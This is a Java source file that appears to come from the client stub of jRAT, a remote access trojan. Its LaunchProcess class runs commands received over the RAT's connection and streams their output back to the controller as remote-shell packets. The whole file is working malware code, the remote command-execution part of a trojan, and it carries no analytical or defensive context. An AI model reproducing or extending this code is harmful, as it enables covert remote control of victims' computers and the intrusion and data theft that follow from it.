package se.jrat.stub;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.stub.packets.outgoing.Packet21RemoteShell;


public class LaunchProcess extends Thread {

	public Process p;
	public String process;
	public static LaunchProcess latest;

	public LaunchProcess(String process) {
		this.process = process;
		latest = this;
	}

	public void run() {
		String line;
		try {
			p = Runtime.getRuntime().exec(process);
			Connection.instance.status(Constants.STATUS_RAN_CMD);
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					Connection.instance.addToSendQueue(new Packet21RemoteShell(line));
				}
			}
			input.close();
			latest = null;
		} catch (Exception ex) {
			Connection.instance.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
			latest = null;
		}
	}

}